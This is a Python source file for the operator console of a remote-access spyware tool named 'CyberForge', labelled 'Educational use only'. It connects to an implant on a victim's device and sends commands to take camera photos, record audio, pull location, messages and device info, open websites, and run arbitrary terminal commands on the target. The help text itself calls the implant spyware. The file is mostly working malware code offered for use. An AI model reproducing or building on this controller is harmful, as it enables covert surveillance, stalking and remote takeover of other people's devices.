
'''
CREATED BY Navtej-Singh-1503
© 2025 Navtej Singh Saggar
Educational use only

17/02/2026

Version - 0.5.3

mail - navtejsingh15032011@gmail.com

'''


import socket
import time
import os
import sys
from FILES.IP import target
from FILES.logo import *
from FILES.color import *



os.system('clear')
time.sleep(2)



print(RED + intro)

print(GREEN + "				 -by    - Navtej-Singh-1503")
print(GREEN + "                                 -mail  - navtejsingh15032011@gmail.com")

SENDER_IP = target
PORT = 9999


cammand = ["info",
           "loc",
           "msg",
           "cam",
           "web"
           ]



while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:

        client.connect((SENDER_IP, PORT))



        print(BLUE+"==============("+RED+"CyberForge"+BLUE+")")
        user = input(BLUE+"====="+RED+"$ "+RESET)
        if user == "exit":
            print(RED+"["+GREEN+"*"+RED+"]"+GREEN+" Exiting .....")
            break
        
        elif user == "rec":
            files = os.listdir()
            base_name = "received_audio"
            extension = ".mp4"
            counter = 1
            filename = f"{base_name}{extension}" 
            while os.path.exists(filename):
                filename = f"{base_name}{counter}{extension}"
                counter += 1

            print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" recoding strated for 15 sec.......")
            
            client.send(user.encode())
            with open(filename , "wb") as f:
                while True:
                    
                    chunk = client.recv(4096)
                    if not chunk:
                        break
                    f.write(chunk)
            print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" Success! File saved as 'received_audio.mp4'")

        elif user == "help":
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" help        =>    Show all cammands")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" exit        =>    Exit portal")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" cam         =>    Get a real time photo from target's device ")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" rec         =>    Start recording from target's device (From 15 Seconds)")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" info        =>    Get info of target's device")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" loc         =>    Get target's device Location")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" msg         =>    Get target's device Massages")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" del         =>    To Delete whitehorse.py")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" web         =>    To open any website on target's device (Website will open on target's device) Use : web <website>")
             print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" terminal    =>    Run any Terminal cammand on Target's System (!! You Will not receive Output!!) Use : terminal <cammand>")

             continue

        elif "del" in user:
            print(RED+"["+GREEN+"!"+RED+"]"+GREEN+" This cammand will delete the spyware")
            delsyp = input(RED+"["+GREEN+"!"+RED+"]"+GREEN+" ARE YOU SURE? [y/n]   ")
            if delsyp.lower == "y":
                print(RED+"["+GREEN+"!"+RED+"]"+GREEN+" IT WILL DELETE IN 10 SECOND ")
                time.sleep(10)
                client.send(user.encode())

            else:
                print(RED+"["+GREEN+"+"+RED+"]"+GREEN+" Canceled!!")
                continue

        elif "del -y" in user:
            print(RED+"["+GREEN+"!"+RED+"]"+GREEN+" IT WILL DELETE IN 10 SECOND ")
            time.sleep(10)
            client.send("del".encode())
        
        elif user == "clear":
            os.system("clear")
            print(RED + intro)
            print(GREEN + "                          -by    - Navtej-Singh-1503")
            print(GREEN + "                          -mail  - navtejsingh15032011@gmail.com")
            continue


        elif "terminal" in user:
            client.send(user.encode())


        elif user in cammand:
            client.send(user.encode())


        else:
            print(RED+"["+GREEN+"!"+RED+"]"+GREEN+' Cammand Not Found!! Try Run "help"')
            continue
    
    
        response = client.recv(4096).decode()
        print(PURPLE+"\n")
        print(response)
        print("----------------------"+RESET)

    except ConnectionRefusedError:
        print(RED+"["+GREEN+"!"+RED+"]"+GREEN+" Error: The Sender script is not running or the IP is wrong.")
        time.sleep(2)
    finally:
        client.close()
